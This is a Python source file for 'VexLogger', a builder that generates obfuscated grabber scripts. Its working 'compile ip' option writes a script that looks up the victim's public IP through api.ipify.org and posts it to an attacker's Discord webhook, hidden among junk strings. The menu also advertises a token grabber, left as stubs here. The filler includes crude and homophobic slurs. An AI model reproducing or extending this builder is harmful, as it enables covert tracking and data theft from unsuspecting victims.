# Libraries ======================+
import os
import time
import sys
import requests

import random
from colorama import Fore

# OnLaunch ========================+
if sys.platform == "linux" or sys.platform == "linux2":
    osys = "linux"
elif sys.platform == "darwin":
    osys = "osx"
elif sys.platform == "win32":
    osys = "win"

# Variables =======================+
osys = ""
desc = [
    "vex >> vw",
    "hello, "+os.getlogin(),
    "remember that one time "+os.getlogin()+" used VexLog",
    "https://discord.gg/YHynjFuH6v",
    "i hope your having a good day",
    os.getlogin()+"is cute"
]

# Functions =======================+


def error(string):
    print(f"{Fore.RED}[x]: {Fore.LIGHTRED_EX}{string}\n")


def warn(string):
    print(f"{Fore.YELLOW}[/]: {Fore.LIGHTYELLOW_EX}{string}\n")


def info(string):
    print(f"{Fore.BLUE}[i]: {Fore.LIGHTBLUE_EX}{string}\n")


def cls():
    if osys == "linux":
        os.system("clear")
    elif osys == "osx":
        os.system("clear")
    elif osys == "win":
        os.system("cls")


def checkconfig():
    if not os.path.exists("Compiled"):
        config = os.mkdir("Compiled")


def banner():
    print(Fore.LIGHTBLACK_EX+f"""                            
█░█ █▀▀ ▀▄▀ ░░▄▀ █▀▀ █▀█ █▀▄▀█ █▀█ █ █░░ █▀▀ █▀█
▀▄▀ ██▄ █░█ ▄▀░░ █▄▄ █▄█ █░▀░█ █▀▀ █ █▄▄ ██▄ █▀▄
2 Types of compiles / 2 Loggers / {random.choices(desc)}
    """)


# Vex Logger ======================+
cls()
banner()
warn("This can get you banned from discord\nStay safe")
info("Type compilers for all compiled scripts")

def vexcm():

    # Command Input
    cmd = input(Fore.YELLOW+f"Compile %\n{Fore.LIGHTBLACK_EX}")

    # Return Command
    if cmd.lower() == "compile ip":
        checkconfig()
        filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
        webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
        newlog = open(f"Compiled/{filename}"+".py", "w+")
        randomstrings = ["dex.lol#1337", "project vex", "woow such a good obfuscator",
        "femor when he sees unsucked dick", "hello all", "vex >> vw", "@everyone",
        "i admit this is not a good compiler", "bruhhhh", "the creator of this is cute",
        "honestlyyyyy", "music is very good for you", "i dont like emos", "hendricko",
        "https://www.youtube.com/channel/UCaEg8bVgAJbVqglXbwulyWw", "buu lol",
        "gthdusibhtn7854y67b8rsbhtjk", "one two three four five six seven eight",
        "insert extreeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeemely long text here",
        "h... h... h... h... h... h... h...", "where my boi hendricko", "stop hacking hacker!!",
        "why you gotta be muted", "the hdmi port that does hdmi when hdmi like hdmi so hdmi port hdmi's the speaker hdmi",
        "brah", "i wonder why your using this unless i sent you it", "maybe i just released it on github",
        "i triedd my very hardest on this i think", "hello there pentagonium", "pls stop using ur soundboard",
        "im inside your walls."]
        newlog.write(f"""
#  ================================
# |         Dex's Compiler         |
#  ================================
#  Please do not mess with the code
#  Reach me on discord dex.lol#1337

'''dex.lol#1377'''
'''''';pass;pass;pass;pass;pass;pass;pass;pass;pass;pass;pass;''''''

import requests;import dhooks;'''''';'''i hope nobody is a skid''';'''gg'''

'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht"
'''{random.choices(randomstrings)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";''''{random.choices(randomstrings)}'''
'''{random.choices(randomstrings)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''x compiler''';pass
'''{random.choices(randomstrings)}''';pass;dex=True;'''dexIIIlIlIlllIllIIIIllIlIII'''
'''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";vw_trash=True;'''{random.choices(randomstrings)}'''
'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
'''{random.choices(randomstrings)}''';pass;'''{random.choices(randomstrings)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(randomstrings)}''';femorgay=True;pass
'''{random.choices(randomstrings)}''';pass;'''x ''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(randomstrings)}''';'''femor when unsucked cock is in there area'''
'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';'''dexIIIlIlI''';dexIlIlIlIlllIllIlIIllIlIll=dhooks.Webhook("{webhook}");'''lllIllIIIIllIlIII''';'''er''';''''''
'''{random.choices(randomstrings)} ''';dex_gay=False;'''{random.choices(randomstrings)}''';dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
'''{random.choices(randomstrings)} {random.choices(randomstrings)}''';jfsiotbj5erwbjymhfg0dmuny958rebuyrtejn8=False;pass;'''{random.choices(randomstrings)}'''
'''{random.choices(randomstrings)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(randomstrings)}'''
'''{random.choices(randomstrings)} ''';dexIlIlIlIlllIllIlIIllIlIll.send(dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(randomstrings)}''';pass;bye=True

'''''';pass;pass;pass;pass;pass;pass;pass;pass;pass;pass;pass;''''''
'''dex.lol#1337'''
        """)
        newlog.close()
    elif cmd.lower() == "compile token":
        pass
    elif cmd.lower() == "compile all": 
        pass
    elif cmd.lower() == "compilers":
        print(f"""
=======================================
Vex Compiler Commands | {random.choices(desc)}
---------------------------------------
[0]: compile ip - compiles a script to
                  grab a targets ip

[1]: compile token - compiles a script
                     to grab a targets
                     token

[2]: compile all - compiles all scripts
=======================================
        """)
    elif cmd.lower() == "cls":
        cls()
    else:
        error("Unknown command, try again.")

    # Loop Compiler
    vexcm()
    
vexcm()